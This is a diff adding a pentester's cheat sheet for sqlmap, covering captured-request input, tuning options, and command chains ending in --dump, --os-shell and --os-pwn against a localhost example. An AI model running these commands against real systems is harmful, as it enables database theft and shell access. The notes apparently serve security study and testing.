@@ -1,0 +1,53 @@
+[ sqlmap ]
+https://tools.kali.org/vulnerability-analysis/sqlmap
+
+[ + ] SQLMAP AND POST DATA:
+--> Intercept HTTP POST request in Burp.
+--> touch request.txt
+--> nano request.txt
+--> paste.
+--> Remove each additional \r\n (Carriage Return & Newline Data - usually just an empty space after each header...)
+--> sqlmap -r request.txt
+
+[ + ] Optionally:
+--> --dbms=mysql (Specify the Database Management System to save a LOT of time with SQLMAP...)
+--> --threads=2 (Specify more threads if you wish - I find two to be fine.)
+--> --time-sec=10 (In the event of time-based SQLi Queries - make the sleep time to 10 seconds...)
+--> --level=2 (Specify the level for SQLMAP - it goes to a maximum of 5 levels.)
+--> --risk=2 (Risk goes up to 3 at max.)
+--> --technique=T (This will specify for any Time-Based versus a value of 'B' which would be "Boolean Based" heavy stack queries.)
+--> --force-ssl (Some modern databases themselves require SSL Protocol.)
+--> --dbs (Extract a Database Name)
+--> -D <database name> (Found a Database Name? Tell SQLMap which one you're interested in.)
+
+[ + ] All Together for request.txt:
+sqlmap -r request.txt
+sqlmap -r request.txt --threads=2
+sqlmap -r request.txt --threads=2 --time-sec=10
+sqlmap -r request.txt --threads=2 --time-sec=10 --level=2
+sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2
+sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2 --force-ssl --force-ssl
+sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2 --force-ssl --dump
+sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2 --force-ssl --dump --os-shell
+sqlmap -r request.txt --threads=2 --time-sec=10 --level=2 --risk=2 --force-ssl --dump --os-pwn
+
+[ + ] On your URL Environment Variable :
+sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl
+--> or
+sqlmap -u $URL --threads=2 --time-sec=10 --level=2 --risk=2 --technique=B --force-ssl
+
+[ + ] Need to specify the DMBS?
+--dbms=<DBMS>
+--dbms=mysql
+--dbms=mssql
+--> etc.
+
+[ + ] Dump all data we get please to the terminal please.
+--dump
+
+[ + ] If the DBMS is configured to permit I/O Operations (Specifically Output). - Shell
+--os-shell
+
+[ + ] Specify a specific parameter to Test (i.e. I want to test parameter9 rather than parameters1-8 as I know that's where the injection point is already).
+-->export URL="http://127.0.0.1:80/superDuperCMS.php?p1=DATA&p2=DATA&p3=DATA&p4=INJECTABLE-POINT
+sqlmap -u $URL --threads=2 --risk=2 --level=3 --dbms=<DBMS> -p p4
